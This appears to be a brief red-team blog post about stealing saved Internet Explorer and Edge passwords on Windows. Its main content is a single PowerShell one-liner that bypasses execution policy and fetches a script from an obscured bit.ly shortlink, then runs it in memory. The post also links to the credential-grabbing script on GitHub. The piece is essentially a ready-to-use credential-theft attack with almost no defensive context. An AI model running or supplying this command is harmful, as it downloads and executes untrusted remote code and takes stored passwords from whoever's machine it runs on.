---
title: Extract stored passwords from browser using Powershell
date: 2020-09-15 09:00:00 +07:00
tags: [browser, savedpasswords, data, collection, redteam]
description: Stealing saved passwords using Powershell
---

In this article, I would like to share powershell code which is useful to extract saved password from Internet Explorer/Microsoft Edge browsers in Windows endpoint.

#### Powershell command:

```powershell
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2K75g15')"
```

##### Execution:

<figure>
<img src="https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/extract-saved-browser-passwords-using-powershell/credgrap.gif" alt="Powershell code">
<figcaption>Powershell command</figcaption>
</figure>

#### References

- [Github](https://github.com/HanseSecure/credgrap_ie_edge)
- [Powershell code](https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/credgrap_ie_edge.ps1)
